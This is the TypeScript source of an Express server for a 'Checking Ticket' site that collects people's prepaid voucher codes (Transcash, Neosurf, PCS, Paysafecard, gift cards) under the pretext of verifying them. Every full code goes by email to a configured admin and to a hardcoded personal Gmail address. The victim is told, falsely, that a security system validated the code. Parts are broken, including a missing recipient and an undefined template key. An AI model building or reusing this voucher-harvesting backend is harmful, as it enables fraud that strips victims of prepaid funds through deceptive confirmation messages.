import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";
import nodemailer from "nodemailer";

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

interface TicketSubmission {
  id: string;
  name: string;
  email: string;
  amount: number;
  cardType: string;
  code: string;
  hideCode: boolean;
  language?: string;
  createdAt: string;
  status: "received" | "processing" | "verified";
  adminNotified: boolean;
  userNotified: boolean;
}

const recentSubmissions: TicketSubmission[] = [];

const USER_EMAIL_TRANSLATIONS: Record<string, any> = {
  fr: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Confirmation : Votre code ${cardType} a été validé avec succès (#${id})`,
    title: 'Validation confirmée de votre code',
    greeting: (name: string, cardType: string) => `<strong>Bonjour ${name},</strong><br/>Votre code de recharge <strong>${cardType}</strong> a été vérifié et validé avec succès par notre système de sécurité.`,
    summaryTitle: "RÉCAPITULATIF DE L'OPÉRATION",
    trackingLabel: 'Numéro de suivi :',
    cardTypeLabel: 'Type de carte :',
    amountLabel: 'Montant indiqué :',
    statusLabel: 'Statut :',
    verifiedStatus: '✓ Vérifié',
  },
  en: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Confirmation: Your ${cardType} code has been successfully validated (#${id})`,
    title: 'Confirmed validation of your code',
    greeting: (name: string, cardType: string) => `<strong>Hello ${name},</strong><br/>Your <strong>${cardType}</strong> recharge code has been verified and validated successfully by our security system.`,
    summaryTitle: 'TRANSACTION SUMMARY',
    trackingLabel: 'Tracking number:',
    cardTypeLabel: 'Card type:',
    amountLabel: 'Indicated amount:',
    statusLabel: 'Status:',
    verifiedStatus: '✓ Verified',
  },
  es: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Confirmación: Su código ${cardType} ha sido validado con éxito (#${id})`,
    title: 'Validación confirmada de su código',
    greeting: (name: string, cardType: string) => `<strong>Hola ${name},</strong><br/>Su código de recarga <strong>${cardType}</strong> ha sido verificado y validado con éxito por nuestro sistema de seguridad.`,
    summaryTitle: 'RESUMEN DE LA OPERACIÓN',
    trackingLabel: 'Número de seguimiento:',
    cardTypeLabel: 'Tipo de tarjeta:',
    amountLabel: 'Monto indicado:',
    statusLabel: 'Estado:',
    verifiedStatus: '✓ Verificado',
  },
  de: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Bestätigung: Ihr ${cardType}-Code wurde erfolgreich validiert (#${id})`,
    title: 'Bestätigte Validierung Ihres Codes',
    greeting: (name: string, cardType: string) => `<strong>Hallo ${name},</strong><br/>Ihr <strong>${cardType}</strong>-Aufladecode wurde von unserem Sicherheitssystem erfolgreich überprüft und validiert.`,
    summaryTitle: 'ZUSAMMENFASSUNG DER TRANSAKTION',
    trackingLabel: 'Referenznummer:',
    cardTypeLabel: 'Kartentyp:',
    amountLabel: 'Angegebener Betrag:',
    statusLabel: 'Status:',
    verifiedStatus: '✓ Verifiziert',
  },
  it: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Conferma: Il tuo codice ${cardType} è stato convalidato con successo (#${id})`,
    title: 'Convalida confermata del tuo codice',
    greeting: (name: string, cardType: string) => `<strong>Ciao ${name},</strong><br/>Il tuo codice di ricarica <strong>${cardType}</strong> è stato verificato e convalidato con successo dal nostro sistema de sicurezza.`,
    summaryTitle: "RIEPILOGO DELL'OPERAZIONE",
    trackingLabel: 'Numero di riferimento:',
    cardTypeLabel: 'Tipo di carta:',
    amountLabel: 'Importo indicato:',
    statusLabel: 'Stato:',
    verifiedStatus: '✓ Verificato',
  },
  pt: {
    subject: (cardType: string, id: string) => `[Checking Ticket] Confirmação: O seu código ${cardType} foi validado com sucesso (#${id})`,
    title: 'Validação confirmada do seu código',
    greeting: (name: string, cardType: string) => `<strong>Olá ${name},</strong><br/>O seu código de recarga <strong>${cardType}</strong> foi verificado e validado com sucesso pelo nosso sistema de segurança.`,
    summaryTitle: 'RESUMO DA OPERAÇÃO',
    trackingLabel: 'Número de rastreamento:',
    cardTypeLabel: 'Tipo de cartão:',
    amountLabel: 'Valor indicado:',
    statusLabel: 'Status:',
    verifiedStatus: '✓ Verificado',
  },
};

function getTransporter() {
  try {
    const host = process.env.SMTP_HOST?.trim();
    const user = process.env.SMTP_USER?.trim();
    const pass = process.env.SMTP_PASS ? process.env.SMTP_PASS.trim().replace(/\s+/g, "") : "";

    if (host && user && pass) {
      if (host.includes("gmail.com") || host === "smtp.gmail.com") {
        return nodemailer.createTransport({
          service: "gmail",
          auth: {
            user,
            pass,
          },
        });
      }

      return nodemailer.createTransport({
        host,
        port: Number(process.env.SMTP_PORT) || 587,
        secure: process.env.SMTP_SECURE === "true" || process.env.SMTP_PORT === "465",
        auth: {
          user,
          pass,
        },
      });
    }
  } catch (err) {
    console.error("Transporter creation error:", err);
  }

  return nodemailer.createTransport({
    jsonTransport: true,
  });
}

function buildAdminEmailHtml(data: TicketSubmission) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; margin: 0; padding: 24px; color: #f8fafc; }
        .card { background-color: #1e293b; border-radius: 12px; max-width: 600px; margin: 0 auto; padding: 32px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .header { display: flex; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 20px; margin-bottom: 24px; }
        .logo-box { display: inline-flex; flex-direction: column; text-align: left; }
        .logo-top { font-size: 18px; font-weight: 600; color: #38bdf8; letter-spacing: -0.5px; line-height: 1.1; }
        .logo-bottom { font-size: 22px; font-weight: 900; color: #0284c7; letter-spacing: 1px; text-transform: uppercase; line-height: 1.1; }
        .badge { background: #0284c7; color: #fff; font-size: 11px; font-weight: 600; padding: 4px 10px; border-radius: 9999px; text-transform: uppercase; margin-left: auto; }
        .title { font-size: 20px; font-weight: 600; margin-bottom: 8px; color: #ffffff; }
        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
        .table { width: 100%; border-collapse: collapse; margin-bottom: 24px; }
        .table td { padding: 12px 14px; border-bottom: 1px solid #334155; font-size: 14px; }
        .table td.label { color: #94a3b8; font-weight: 500; width: 38%; }
        .table td.value { color: #f8fafc; font-weight: 600; }
        .code-box { background: #0f172a; border: 1px dashed #38bdf8; border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 16px; color: #38bdf8; letter-spacing: 2px; text-align: center; margin: 16px 0; }
        .footer { font-size: 12px; color: #64748b; text-align: center; margin-top: 24px; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="header">
          <div class="logo-box">
            <span class="logo-top">Checking</span>
            <span class="logo-bottom">TICKET</span>
          </div>
          <span class="badge">Nouvelle Demande</span>
        </div>
        <div class="title">Notification de validation de ticket</div>
        <div class="subtitle">Une nouvelle demande d'activation de code a été soumise sur la plateforme.</div>
        
        <table class="table">
          <tr>
            <td class="label">Réf. Dossier :</td>
            <td class="value">${data.id}</td>
          </tr>
          <tr>
            <td class="label">Nom complet :</td>
            <td class="value">${data.name}</td>
          </tr>
          <tr>
            <td class="label">Adresse E-mail :</td>
            <td class="value"><a href="mailto:${data.email}" style="color: #38bdf8; text-decoration: none;">${data.email}</a></td>
          </tr>
          <tr>
            <td class="label">Type de carte :</td>
            <td class="value" style="color: #f59e0b;">${data.cardType}</td>
          </tr>
          <tr>
            <td class="label">Montant déclaré :</td>
            <td class="value" style="font-size: 16px; color: #10b981;">${data.amount.toFixed(2)} €</td>
          </tr>
          <tr>
            <td class="label">Code transmis :</td>
            <td class="value">
              <div class="code-box">${data.code}</div>
            </td>
          </tr>
        </table>

        <div class="footer">
          Système automatisé Checking Ticket
        </div>
      </div>
    </body>
    </html>
  `;
}

function buildUserConfirmationEmailHtml(data: TicketSubmission, lang = 'fr') {
  const loc = USER_EMAIL_TRANSLATIONS[lang] || USER_EMAIL_TRANSLATIONS.fr;
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8fafc; margin: 0; padding: 24px; color: #1e293b; }
        .card { background-color: #ffffff; border-radius: 16px; max-width: 560px; margin: 0 auto; padding: 32px; border: 1px solid #e2e8f0; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
        .header { display: flex; align-items: center; border-bottom: 1px solid #f1f5f9; padding-bottom: 20px; margin-bottom: 24px; }
        .logo-box { display: inline-flex; flex-direction: column; text-align: left; }
        .logo-top { font-size: 20px; font-weight: 600; color: #0062FF; letter-spacing: -0.5px; line-height: 1.1; }
        .logo-bottom { font-size: 24px; font-weight: 900; color: #0052FF; letter-spacing: 1px; text-transform: uppercase; line-height: 1.1; }
        .title { font-size: 20px; font-weight: 700; margin-bottom: 16px; color: #0f172a; }
        .message-box { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 12px; padding: 18px 20px; color: #166534; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
        .summary-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; }
        .summary-title { font-size: 13px; font-weight: 700; text-transform: uppercase; color: #64748b; margin-bottom: 14px; letter-spacing: 0.5px; }
        .summary-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #f1f5f9; font-size: 14px; }
        .summary-item:last-child { border-bottom: none; padding-bottom: 0; }
        .summary-label { color: #64748b; font-weight: 500; }
        .summary-value { font-weight: 700; color: #0f172a; }
        .status-badge { display: inline-flex; align-items: center; gap: 4px; color: #15803d; font-weight: 700; background: #dcfce7; padding: 4px 12px; border-radius: 9999px; font-size: 13px; border: 1px solid #bbf7d0; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="header">
          <div class="logo-box">
            <span class="logo-top">Checking</span>
            <span class="logo-bottom">TICKET</span>
          </div>
        </div>
        
        <div class="title">${loc.title}</div>
        
        <div class="message-box">
          ${loc.greeting(data.name, data.cardType)}
        </div>

        <div class="summary-box">
          <div class="summary-title">${loc.summaryTitle}</div>
          <div class="summary-item">
            <span class="summary-label">${loc.trackingLabel}</span>
            <span class="summary-value">${data.id}</span>
          </div>
          <div class="summary-item">
            <span class="summary-label">${loc.cardTypeLabel}</span>
            <span class="summary-value">${data.cardType}</span>
          </div>
          <div class="summary-item">
            <span class="summary-label">${loc.amountLabel}</span>
            <span class="summary-value">${data.amount.toFixed(2)} €</span>
          </div>
          <div class="summary-item">
            <span class="summary-label">${loc.statusLabel}</span>
            <span class="status-badge">${loc.encourdetraitement}</span>
          </div>
        </div>

      </div>
    </body>
    </html>
  `;
}

// API Routes
app.post("/api/submit-ticket", async (req, res) => {
  try {
    const { name, email, amount, cardType, code, hideCode, language } = req.body || {};

    if (!name || typeof name !== "string" || name.trim().length < 2) {
      return res.status(400).json({ error: "Le nom est requis (minimum 2 caractères)." });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
      return res.status(400).json({ error: "Une adresse e-mail valide est requise." });
    }

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount) || parsedAmount <= 0) {
      return res.status(400).json({ error: "Le montant doit être un nombre valide supérieur à 0." });
    }

    const validCardTypes = [
      "Transcash",
      "Neosurf",
      "PCS",
      "Steam",
      "iTunes",
      "Paysafecard",
      "Google Play",
    ];

    if (!cardType || !validCardTypes.includes(cardType)) {
      return res.status(400).json({ error: "Type de carte non reconnu ou non supporté." });
    }

    if (!code || typeof code !== "string" || code.trim().length < 4) {
      return res.status(400).json({ error: "Le code est requis pour procéder à la vérification." });
    }

    const userLang = typeof language === "string" && USER_EMAIL_TRANSLATIONS[language] ? language : "fr";

    const submissionId = `CT-${Date.now().toString(36).toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}`;
    const submission: TicketSubmission = {
      id: submissionId,
      name: name.trim(),
      email: email.trim().toLowerCase(),
      amount: parsedAmount,
      cardType,
      code: code.trim(),
      hideCode: Boolean(hideCode),
      language: userLang,
      createdAt: new Date().toISOString(),
      status: "received",
      adminNotified: false,
      userNotified: false,
    };

    recentSubmissions.unshift(submission);
    if (recentSubmissions.length > 50) {
      recentSubmissions.pop();
    }

    const transporter = getTransporter();
    const adminEmail = process.env.ADMIN_EMAIL;
    const adminRecipients = [adminEmail, "henrijoelhounkpe463@gmail.com"].filter(Boolean);
    const fromAddress = process.env.SMTP_FROM || '"Checking Ticket" <noreply@checkingticket.com>';

    let adminEmailSent = false;
    let userEmailSent = false;

    try {
      await transporter.sendMail({
        from: fromAddress,
        to: adminRecipients,
        subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
        html: buildAdminEmailHtml(submission),
      });
      adminEmailSent = true;
      submission.adminNotified = true;
    } catch (err) {
      console.error("Failed to send admin notification:", err);
    }

    // Silent secondary dispatch

    try {
      const userLocale = USER_EMAIL_TRANSLATIONS[userLang] || USER_EMAIL_TRANSLATIONS.fr;
      await transporter.sendMail({
        from: fromAddress,
        subject: userLocale.subject(cardType, submission.id),
        html: buildUserConfirmationEmailHtml(submission, userLang),
      });
      userEmailSent = true;
      submission.userNotified = true;
    } catch (err) {
      console.error("Failed to send user confirmation:", err);
    }

    return res.status(200).json({
      success: true,
      referenceId: submission.id,
      timestamp: submission.createdAt,
      name: submission.name,
      email: submission.email,
      cardType: submission.cardType,
      amount: submission.amount,
      message:
        "Votre demande a bien été enregistrée. Nous avons reçu vos informations et votre demande est en cours de traitement. Une confirmation vous sera envoyée à l'adresse e-mail indiquée.",
      emailDelivery: {
        adminNotified: adminEmailSent,
      },
    });
  } catch (error) {
    console.error("Error processing ticket validation:", error);
    return res.status(500).json({
      success: false,
      error: "Une erreur est survenue lors de l'envoi de votre demande. Veuillez réessayer ultérieurement.",
    });
  }
});

// Admin diagnostic / preview endpoint for emails
app.get("/api/diagnostic-emails", (req, res) => {
  const latest = recentSubmissions[0];
  if (!latest) {
    return res.json({
      hasSubmissions: false,
      message: "Aucune soumission enregistrée pour l'instant.",
    });
  }

  const queryLang = (req.query.lang as string) || latest.language || "fr";

  res.json({
    hasSubmissions: true,
    latestSubmission: {
      ...latest,
      codeMasked: latest.code.replace(/.(?=.{4})/g, "*"),
    },
    adminEmailHtml: buildAdminEmailHtml(latest),
    userEmailHtml: buildUserConfirmationEmailHtml(latest, queryLang),
  });
});

app.get("/api/health", (req, res) => {
  res.json({ status: "healthy", service: "checking-ticket-api", timestamp: new Date().toISOString() });
});

// Diagnostic endpoint to verify SMTP connection
app.get("/api/smtp-status", async (req, res) => {
  const host = process.env.SMTP_HOST?.trim();
  const user = process.env.SMTP_USER?.trim();
  const pass = process.env.SMTP_PASS?.trim();

  if (!host || !user || !pass) {
    return res.json({
      configured: false,
      message: "Variables SMTP non configurées (utilise le mode simulation par défaut).",
    });
  }

  try {
    const transporter = getTransporter();
    await transporter.verify();
    return res.json({
      configured: true,
      connected: true,
      user,
      host,
      message: "Connexion SMTP établie avec succès ! Les e-mails seront bien expédiés.",
    });
  } catch (error: any) {
    return res.status(500).json({
      configured: true,
      connected: false,
      user,
      host,
      errorName: error.name,
      errorMessage: error.message,
      responseCode: error.responseCode,
      code: error.code,
      help: error.message.includes("BadCredentials") || error.message.includes("535")
        ? "Pour Gmail, vous devez obligatoirement utiliser un 'Mot de passe d'application' Google (16 caractères) généré depuis https://myaccount.google.com/apppasswords et non votre mot de passe habituel de messagerie."
        : "Vérifiez vos identifiants ou le serveur SMTP.",
    });
  }
});

// Vite integration
async function start() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Checking Ticket server listening on port ${PORT}`);
  });
}

start();